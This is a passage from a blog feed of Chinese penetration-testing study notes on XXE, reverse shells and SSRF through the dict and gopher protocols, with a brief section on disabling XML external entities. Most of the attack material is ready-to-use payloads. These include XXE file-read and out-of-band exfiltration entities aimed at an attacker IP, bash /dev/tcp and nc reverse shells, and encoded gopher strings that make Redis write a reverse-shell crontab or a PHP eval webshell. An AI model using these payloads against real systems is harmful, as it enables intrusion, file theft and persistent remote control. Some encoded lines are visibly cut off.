class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD); <span class="comment">//加载客户端输入的XML内容</span></span><br><span class="line">    <span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);<span class="comment">//获取XML文档节点，如果成功则返回SimpleXMLElement对象，失败则返回False</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$creds</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前提知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XXE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXE</title>
      <link href="/2022/10/10/XXE/"/>
      <url>/2022/10/10/XXE/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>XXE就是<strong>XML外部实体注入</strong>。当允许引用外部实体时，通过构造恶意内容，就可能导致任意文件读取、系统命令执行、内网端口探测、攻击内网网站等危害</p><p>XML介绍——看我这篇<a href="https://www.jqsafe.top/2022/10/10/XXE_XML">XXE——XML</a></p><h2 id="XXE有回显利用"><a href="#XXE有回显利用" class="headerlink" title="XXE有回显利用"></a>XXE有回显利用</h2><h3 id="使用file-x2F-x2F-协议"><a href="#使用file-x2F-x2F-协议" class="headerlink" title="使用file:&#x2F;&#x2F;协议"></a>使用file:&#x2F;&#x2F;协议</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE creds [  </span><br><span class="line">&lt;!ENTITY goodies SYSTEM &quot;file:///C:/phpStudy/1.txt&quot;&gt; ]&gt; </span><br><span class="line">&lt;creds&gt;&amp;goodies;&lt;/creds&gt;</span><br></pre></td></tr></table></figure><h3 id="使用php-x2F-x2F-filter-x2F-read转化"><a href="#使用php-x2F-x2F-filter-x2F-read转化" class="headerlink" title="使用php:&#x2F;&#x2F;filter&#x2F;read转化"></a>使用php:&#x2F;&#x2F;filter&#x2F;read转化</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE creds [  </span><br><span class="line">&lt;!ENTITY goodies SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///C:/phpStudy/1.txt&quot;&gt; ]&gt; </span><br><span class="line">&lt;creds&gt;&amp;goodies;&lt;/creds&gt;</span><br></pre></td></tr></table></figure><h2 id="XXE无回显的利用"><a href="#XXE无回显的利用" class="headerlink" title="XXE无回显的利用"></a>XXE无回显的利用</h2><p>需要借助xxe_file.dtd文件，这个文件可以上传至个人网站</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all</span><br><span class="line">        &quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#x27;http://攻击机IP:监听端口/?%file;&#x27;&gt;&quot;</span><br><span class="line">        &gt;</span><br><span class="line">        %all;</span><br></pre></td></tr></table></figure><p>然后构造发给漏洞服务器的包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line"> &lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///c:/Windows/win.ini&quot;&gt;</span><br><span class="line"> &lt;!ENTITY % dtd SYSTEM &quot;http://www.localhost.com/xxe_file.dtd&quot;&gt;</span><br><span class="line">%dtd;</span><br><span class="line">%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p>然后使用kali监听</p><p><img src="/../note_image/image-20221010195027210.png" alt="image-20221010195027210"></p><p>最后把反弹过来的数据进行base64解码就行了</p><p><img src="/../note_image/image-20221010195554491.png" alt="image-20221010195554491"></p><h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>可以使用禁用外部实体的方法，从而起到防御目的</p><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libxml_disable_entity_loader(true)</span><br></pre></td></tr></table></figure><h3 id="JAVA"><a href="#JAVA" class="headerlink" title="JAVA"></a>JAVA</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory dbf = DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(false);</span><br><span class="line"></span><br><span class="line">.setFeature(&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;,ture)</span><br><span class="line">.setFeature(&quot;http://xml.org/sax/features/external-general-entities&quot;,false)</span><br><span class="line">.setFeature(&quot;http://xml.org/sax/features/external-farameter-entities&quot;,false)</span><br></pre></td></tr></table></figure><h3 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">from lxml import etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 外网漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XXE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反弹shell</title>
      <link href="/2022/10/09/%E5%8F%8D%E5%BC%B9shell/"/>
      <url>/2022/10/09/%E5%8F%8D%E5%BC%B9shell/</url>
      
        <content type="html"><![CDATA[<p>kali为攻击者的系统，ip为：192.168.136.129，开放7777端口且没被占用</p><p>受害机ip为：192.168.136.128，开放7777端口且没被占用</p><h3 id="正向反弹shell"><a href="#正向反弹shell" class="headerlink" title="正向反弹shell"></a>正向反弹shell</h3><p>先去攻击机开启监听</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 7777</span><br></pre></td></tr></table></figure><p>再去受害机开启服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 7777 -e /bin/bash</span><br></pre></td></tr></table></figure><p>正向反弹是目标机先执行nc命令，然后kali上再进行nc监听，即可反弹shell。</p><p>需要目标机安装nc。</p><h3 id="反向反弹shell"><a href="#反向反弹shell" class="headerlink" title="反向反弹shell"></a>反向反弹shell</h3><p>方法1：bash反弹</p><p>先去攻击机开启监听</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 7777</span><br></pre></td></tr></table></figure><p>再去受害机开启服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/192.168.136.129/7777 0&gt;&amp;1</span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>SSRF——dict协议</title>
      <link href="/2022/10/08/SSRF_dict%E5%8D%8F%E8%AE%AE/"/>
      <url>/2022/10/08/SSRF_dict%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<h2 id="dict协议"><a href="#dict协议" class="headerlink" title="dict协议"></a>dict协议</h2><p>泄露安装软件版本信息，查看端口，操作内网redis服务等等</p><h3 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h3><p>1.探测内网主机</p><p>2.探测端口开放情况和指纹信息</p><p>3.执行命令</p><h3 id="使用方式"><a href="#使用方式" class="headerlink" title="使用方式"></a>使用方式</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1、dict://server_ip:port/命令:参数</span><br><span class="line"></span><br><span class="line">2、向服务器的端口请求为 命令:参数 ，并在模为自动补上\r\n(CRLF)，为漏洞利用增加了便利</span><br><span class="line"></span><br><span class="line">3、dict协议执行命令要一条一条执行</span><br></pre></td></tr></table></figure><h3 id="使用条件"><a href="#使用条件" class="headerlink" title="使用条件"></a>使用条件</h3><p>必须是redis未设置密码的情况下才可以利用dict执行命令，否则即便知道密码也无法进行其他操作。因为在每一次发送命令的同时都需要进行身份认证，即第一次发送auth mima 通过验证，第二次发射get name时还是提示要密码认证，说明redis是无记忆的。而dict一次只能执行一条命令，所以无法操作。</p><h3 id="格式示例"><a href="#格式示例" class="headerlink" title="格式示例"></a>格式示例</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.136.132/ssrf.php?url=dict://127.0.0.1:6379/set:hack:hacker</span><br></pre></td></tr></table></figure><p>浏览器发包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.136.132/ssrf.php?url=dict://127.0.0.1:6379/set+tom+&quot;\n\n&lt;\x3fphp+phpinfo();\x3f&gt;\n\n&quot;</span><br><span class="line"></span><br><span class="line">http://192.168.136.132/ssrf.php?url=dict://127.0.0.1:6379/config:set:dir:/www/admin/localhost_80/wwwroot</span><br><span class="line"></span><br><span class="line">http://192.168.136.132/ssrf.php?url=dict://127.0.0.1:6379/config:set:dbfilename:shell.php</span><br><span class="line"></span><br><span class="line">http://192.168.136.132/ssrf.php?url=dict://127.0.0.1:6379/bgsave</span><br></pre></td></tr></table></figure><p>curl发包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">curl http://192.168.136.132/ssrf.php?url=dict://127.0.0.1:6379/set:tom:\&quot;\\x0a\\x0a\\x0a\\x0a\\x3c\\x3f\\x70\\x68\\x70\\x20\\x70\\x68\\x70\\x69\\x6e\\x66\\x6f\\x28\\x29\\x3b\\x3f\\x3e\\x0a\\x0a\\x0a\\x0a\&quot;</span><br><span class="line"></span><br><span class="line">curl http://192.168.136.132/ssrf.php?url=dict://127.0.0.1:6379/config:set:dir:/www/admin/localhost_80/wwwroot</span><br><span class="line"></span><br><span class="line">curl http://192.168.136.132/ssrf.php?url=dict://127.0.0.1:6379/config:set:dbfilename:shell.php</span><br><span class="line"></span><br><span class="line">curl http://192.168.136.132/ssrf.php?url=dict://127.0.0.1:6379/bgsave</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 外网漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF——gopher协议</title>
      <link href="/2022/10/08/SSRF_gopher%E5%8D%8F%E8%AE%AE/"/>
      <url>/2022/10/08/SSRF_gopher%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，gopher使用TCP协议的<strong>70</strong>端口。</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>利用此协议可以攻击内网的 Redis、Mysql、FastCGI、Ftp等等，也可以发送 GET、POST 请求。是SSRF利用中最强大的协议</p><h4 id="利用限制"><a href="#利用限制" class="headerlink" title="利用限制"></a>利用限制</h4><p>gopher协议在各个编程语言中的使用限制</p><table><thead><tr><th>协议</th><th>PHP</th><th>Java</th><th>Curl</th><th>Perl</th><th>ASP.NET</th></tr></thead><tbody><tr><td>gopher</td><td>–wite-curlwrappers且php版本至少为5.3</td><td>小于JDK1.7</td><td>低版本不支持</td><td>支持</td><td>小于版本3</td></tr></tbody></table><h4 id="gopher协议功能"><a href="#gopher协议功能" class="headerlink" title="gopher协议功能"></a>gopher协议功能</h4><p>–wite-curlwrappers选项含义：</p><p>运用curl工具打开url流 , curl使用curl –version查看版本以及支持的协议</p><h2 id="发送GET、POST请求"><a href="#发送GET、POST请求" class="headerlink" title="发送GET、POST请求"></a>发送GET、POST请求</h2><p>gopher协议支持发出GET、POST请求：可以先截获GET请求包和POST请求包，再构成符合gopher协议的请求。</p><p>方式：gopher:&#x2F;&#x2F;ip:port&#x2F;_TCP&#x2F;IP数据流</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">示例：gopher://127.0.0.1:6666/_TCP/IP数据流</span><br></pre></td></tr></table></figure><h3 id="构造GET请求包"><a href="#构造GET请求包" class="headerlink" title="构造GET请求包"></a>构造GET请求包</h3><p>原始GET请求包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET /test.php?url=tom HTTP/1.1</span><br><span class="line">HOST: 192.168.1.1</span><br></pre></td></tr></table></figure><p>空格和问号进行url编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET%20/test.php%3furl=tom%20HTTP/1.1</span><br><span class="line">HOST:%20192.168.1.1</span><br></pre></td></tr></table></figure><p>换行和结尾加上 %0d%0a</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET%20/test.php%3furl=tom%20HTTP/1.1%0d%0a</span><br><span class="line">HOST:%20192.168.1.1%0d%0a</span><br></pre></td></tr></table></figure><p>构造好的GET请求包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET%20/test.php%3furl=tom%20HTTP/1.1%0d%0aHOST:%20192.168.1.1%0d%0a</span><br></pre></td></tr></table></figure><p>利用kali的curl gopher 发送结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl gopher://192.168.1.1/_GET%20/test.php%3furl=tom%20HTTP/1.1%0d%0aHOST:%20192.168.1.1%0d%0a</span><br></pre></td></tr></table></figure><h3 id="构造POST请求包"><a href="#构造POST请求包" class="headerlink" title="构造POST请求包"></a>构造POST请求包</h3><p>切记：Content-Length和POST的参数长度必须一致</p><p>原始POST请求包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /test.php HTTP/1.1</span><br><span class="line">Host: 192.168.1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 8</span><br><span class="line"></span><br><span class="line">url=toms</span><br></pre></td></tr></table></figure><p>空格进行url编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST%20/test.php%20HTTP/1.1</span><br><span class="line">Host:%20192.168.1.1</span><br><span class="line">Content-Type:%20application/x-www-form-urlencoded</span><br><span class="line">Content-Length:%208</span><br><span class="line"></span><br><span class="line">url=toms</span><br></pre></td></tr></table></figure><p>换行和结尾加上 %0d%0a</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST%20/test.php%20HTTP/1.1%0d%0a</span><br><span class="line">Host:%20192.168.1.1%0d%0a</span><br><span class="line">Content-Type:%20application/x-www-form-urlencoded%0d%0a</span><br><span class="line">Content-Length:%208%0d%0a</span><br><span class="line">%0d%0a</span><br><span class="line">url=toms%0d%0a</span><br></pre></td></tr></table></figure><p>构造好的POST请求包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST%20/test.php%20HTTP/1.1%0d%0aHost:%20192.168.1.1%0d%0aContent-Type:%20application/x-www-form-urlencoded%0d%0aContent-Length:%208%0d%0a%0d%0aurl=toms%0d%0a</span><br></pre></td></tr></table></figure><p>利用kali的curl gopher 发送结果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl gopher://192.168.1.1/_POST%20/test.php%20HTTP/1.1%0d%0aHost:%20192.168.1.1%0d%0aContent-Type:%20application/x-www-form-urlencoded%0d%0aContent-Length:%208%0d%0a%0d%0aurl=toms%0d%0a</span><br></pre></td></tr></table></figure><h4 id="与构造GET请求包的区别"><a href="#与构造GET请求包的区别" class="headerlink" title="与构造GET请求包的区别"></a>与构造GET请求包的区别</h4><p>POST与GET传参的区别：它有4个参数为必要参数 </p><p>需要传递Content-Type,Content-Length,host,post的参数</p><h2 id="gopher攻击redis"><a href="#gopher攻击redis" class="headerlink" title="gopher攻击redis"></a>gopher攻击redis</h2><p>主要是利用了redis的热备份功能</p><p>内容格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set &#x27;redis的key&#x27; &quot;备份内容&quot;</span><br><span class="line">config set dir &#x27;文件路径&#x27;</span><br><span class="line">config set dbfilename &#x27;文件名&#x27;</span><br><span class="line">save</span><br></pre></td></tr></table></figure><h3 id="写反弹shell"><a href="#写反弹shell" class="headerlink" title="写反弹shell"></a>写反弹shell</h3><p>先编辑内容（这里写的是一个反弹shell的计划任务）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set tom &quot;\n\n\n\n* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.1.1/8888 0&gt;&amp;1\n\n\n\n&quot;//其中多个\n是为了防止本身文件就是存在的且文件里有内容，后面的ip地址和端口对应的是 攻击机 监听的ip地址和端口</span><br><span class="line">config set dir /etc///文件生成的路径</span><br><span class="line">config set dbfilename crontab//文件生成的名字</span><br><span class="line">save//保存操作</span><br></pre></td></tr></table></figure><p>把编辑的内容全部拿去进行第一次url编码，然后把所有的%0a替换成%0d%0a，结尾再加上%0d%0a，得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%73%65%74%20%74%6f%6d%20%22%5c%6e%5c%6e%5c%6e%5c%6e%2a%20%2a%20%2a%20%2a%20%2a%20%72%6f%6f%74%20%62%61%73%68%20%2d%69%20%3e%26%20%2f%64%65%76%2f%74%63%70%2f%31%39%32%2e%31%36%38%2e%31%2e%31%2f%38%38%38%38%20%30%3e%26%31%5c%6e%5c%6e%5c%6e%5c%6e%22%0d%0a%63%6f%6e%66%69%67%20%73%65%74%20%64%69%72%20%2f%65%74%63%2f%0d%0a%63%6f%6e%66%69%67%20%73%65%74%20%64%62%66%69%6c%65%6e%61%6d%65%20%63%72%6f%6e%74%61%62%0d%0a%73%61%76%65%0d%0a</span><br></pre></td></tr></table></figure><p>再把第一次操作后得到的url编码再进行二次url编码，得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="linespan><br></pre></td></tr></table></figure><p>编译gopher语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:6379/_</span><br></pre></td></tr></table></figure><p>冒号和斜杠进行url编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher%3a%2f%2f127.0.0.1%3a6379%2f_</span><br></pre></td></tr></table></figure><p>再把gopher语句和二次url编码的结果拼接，利用kali的curl gopher 或者浏览器直接发送结果(浏览器直接http:&#x2F;&#x2F;开头即可)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://192.168.1.1/ssrf.php?url=gopher%3a%2f%2f127.0.0.1%3a6379%2fspan><br></pre></td></tr></table></figure><p>最后在攻击机终端输入，等待受害机的反弹shell即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 8888//这里端口是之前写入的端口</span><br></pre></td></tr></table></figure><h3 id="写webshell"><a href="#写webshell" class="headerlink" title="写webshell"></a>写webshell</h3><p>先编辑内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">set tom &quot;\n\n\n\n&lt;?php @eval(&amp;_GET[&#x27;url&#x27;]); ?&gt;\n\n\n\n&quot;//其中多个\n是为了防止本身文件就是存在的且文件里有内容，后面的ip地址和端口对应的是 攻击机 监听的ip地址和端口</span><br><span class="line">config set dir /www/admin/localhost_80/wwwroot//文件生成的路径,写到网站根目录</span><br><span class="line">config set dbfilename shell.php//文件生成的名字</span><br><span class="line">save//保存操作</span><br></pre></td></tr></table></figure><p>把编辑的内容全部拿去进行第一次url编码，然后把所有的%0a替换成%0d%0a，结尾再加上%0d%0a，得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%73%65%74%20%74%6f%6d%20%22%5c%6e%5c%6e%5c%6e%5c%6e%3c%3f%70%68%70%20%40%65%76%61%6c%28%26%5f%47%45%54%5b%27%75%72%6c%27%5d%29%3b%20%3f%3e%5c%6e%5c%6e%5c%6e%5c%6e%22%0d%0a%63%6f%6e%66%69%67%20%73%65%74%20%64%69%72%20%2f%77%77%77%2f%61%64%6d%69%6e%2f%6c%6f%63%61%6c%68%6f%73%74%5f%38%30%2f%77%77%77%72%6f%6f%74%0d%0a%63%6f%6e%66%69%67%20%73%65%74%20%64%62%66%69%6c%65%6e%61%6d%65%20%73%68%65%6c%6c%2e%70%68%70%0d%0a%73%61%76%65%0d%0a</span><br></pre></td></tr></table></figure><p>再把第一次操作后得到的url编码再进行二次url编码，得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="linespan><br></pre></td></tr></table></figure><p>编译gopher语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:6379/_</span><br></pre></td></tr></table></figure><p>冒号和斜杠进行url编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher%3a%2f%2f127.0.0.1%3a6379%2f_</span><br></pre></td></tr></table></figure><p>再把gopher语句和二次url编码的结果拼接，利用kali的curl gopher 或者浏览器直接发送结果(浏览器直接http:&#x2F;&#x2F;开头即可)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://192.168.1.1/ssrf.php?url=gopher%3a%2f%2f127.0.0.1%3a6379%2f_%25%37%33%25%36%35%25%37%34%25%32%30%25%37%34%25%36%66%25%36%64%25%32%30%25%32%32%25%35%63%25%36%65%25%35%63%25%36%65%25%35%63%25%36%65%25%35%63%25%36%65%25%33%63%25%33%66%25%37%30%25%36%38%25%37%30%25%32%30%25%34%30%25%36%35%25%37%36%25%36%31%25%36%63%25%32%38%25%32%36%25%35%66%25%34%37%25%34%35%25%35%34%25%35%62%25%32%37%25%37%35%25%37%32%25%36%63%25%32%37%25%35%64%25%32%39%25%33%62%25%32%30%25%33%66%25%33%65%25%35%63%25%36%65%25%35%63%25%36%65%25%35%63%25%36%65%25%35%63%25%36%65%25%32%32%25%30%64%25%30%61%25%36%33%25%36%66%25%36%65%25%36%36%25%36%39%25%36%37%25%32%30%25%37%33%25%36%35%25%37%34%25%32%30%25%36%34%25%36%39%25%37%32%25%32%30%25%32%66%25%37%37%25%37%37%25%37%37%25%32%66%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65%25%32%66%25%36%63%25%36%66%25%36%33%25%36%31%25%36%63%25%36%38%25%36%66%25%37%33%25%37%34%25%35%66%25%33%38%25%33%30%25%32%66%25%37%37%25%37%37%25%37%37%25%37%32%25%36%66%25%36%66%25%37%34%25%30%64%25%30%61%25%36%33%25%36%66%25%36%65%25%36%36%25%36%39%25%36%37%25%32%30%25%37%33%25%36%35%25%37%34%25%32%30%25%36%34%25%36%32%25%36%36%25%36%39%25%36%63%25%36%35%25%36%65%25%36%31%25%36%64%25%36%35%25%32%30%25%37%33%25%36%38%25%36%35%25%36%63%25%36%63%25%32%65%25%37%30%25%36%38%25%37%30%25%30%64%25%30%61%25%37%33%25%36%31%25%37%36%25%36%35%25%30%64%25%30%61</span><br></pre></td></tr></table></figure><p>最后使用菜刀或者蚁剑进行连接即可</p><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>大部分PHP并不会开启fopen的gopher wrapper</p><p>file_get_contents的gopher协议不能URLencode</p><p>file_get_contents 关于Gopher的302跳转有bug，导致利用失败</p><p>PHP的curl默认不follow302跳转</p><p>curl&#x2F;libcurl 7.43以上gopher协议存在bug(%00截断)，经测试7.49可用</p>]]></content>
      
      
      <categories>
          
          <category> 外网漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SSRF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRF漏洞</title>
      <link href="/2022/10/08/SSRF/"/>
      <url>/2022/10/08/SSRF/</url>
      
        <content type="html"><![CDATA[<h3 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h3><p>一种由攻击者构造形成由服务端发起请求的一个安全漏洞。一般情况下，</p><p>SSRF攻击的目标是外网无法访问的内部系统</p><h3 id="产生原理"><a href="#产生原理" class="headerlink" title="产生原理"></a>产生原理</h3><p>服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤和限制</p><p>PS:类似于远程文件包含，但是危害更大</p><h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><p>1.可以对外网服务器所在的内网、本地进行端口扫描，获取一些服务的banner信息</p><p>2.攻击运行在内网或者本地的应用程序</p><p>3.对内网web应用进行指纹识别，通过访问默认文件夹实现。</p><p>4.攻击内外网的web应用。sql注入、struct2、redis等</p><p>5.利用file协议读取本地文件</p><h3 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h3><p>file_get_contents将文件的内容读入到一个字符串中,但遇到读大文件操作时，不建议使用。可以考虑<a href="https://baike.baidu.com/item/curl/10098606?fromModule=lemma_inlink">curl</a>等方式代替</p><p>fsockopen用于打开网络的 Socket 链接。</p><p>curl_exec执行给定的cURL会话。这个函数应该在初始化一个cURL会话并且全部的选项都被设置后被调用。</p><h3 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h3><h4 id="一-Web功能查找"><a href="#一-Web功能查找" class="headerlink" title="一.Web功能查找"></a>一.Web功能查找</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">由原理可以看出，SSRF是由于服务端获取其他服务器的相关信息的功能中形成的，我们一般正常去访问页面,是不是页面上会有很多的图片,一般来说,这些图片是不是我浏览器去请求的。</span><br></pre></td></tr></table></figure><h4 id="二-通过URL地址分享网页内容"><a href="#二-通过URL地址分享网页内容" class="headerlink" title="二.通过URL地址分享网页内容"></a>二.通过URL地址分享网页内容</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">早期应用中 ，为了更好的用户体验，Web应用在分享功能中，通常会获取目标URL地址网页内容中&lt;title&gt;&lt;/title&gt;标签或者&lt;metaname=“description”content=“”/&gt;标签中content的文本内容提供更好的用户体验</span><br></pre></td></tr></table></figure><h4 id="三-转码服务"><a href="#三-转码服务" class="headerlink" title="三.转码服务"></a>三.转码服务</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 